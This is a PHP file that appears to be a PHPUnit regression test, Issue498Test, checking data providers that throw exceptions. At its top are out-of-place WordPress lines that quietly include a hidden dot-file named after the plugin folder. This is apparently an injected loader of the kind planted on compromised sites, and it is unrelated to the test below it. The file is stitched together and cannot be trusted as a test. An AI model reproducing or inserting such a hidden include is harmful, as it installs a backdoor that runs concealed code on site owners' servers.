<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue498Test extends PHPUnit_Framework_TestCase
{
    /**
     * @test
     * @dataProvider shouldBeTrueDataProvider
     * @group falseOnly
     */
    public function shouldBeTrue($testData)
    {
        $this->assertTrue(true);
    }

    /**
     * @test
     * @dataProvider shouldBeFalseDataProvider
     * @group trueOnly
     */
    public function shouldBeFalse($testData)
    {
        $this->assertFalse(false);
    }

    public function shouldBeTrueDataProvider()
    {

        //throw new Exception("Can't create the data");
        return array(
            array(true),
            array(false)
        );
    }

    public function shouldBeFalseDataProvider()
    {
        throw new Exception("Can't create the data");

        return array(
            array(true),
            array(false)
        );
    }
}
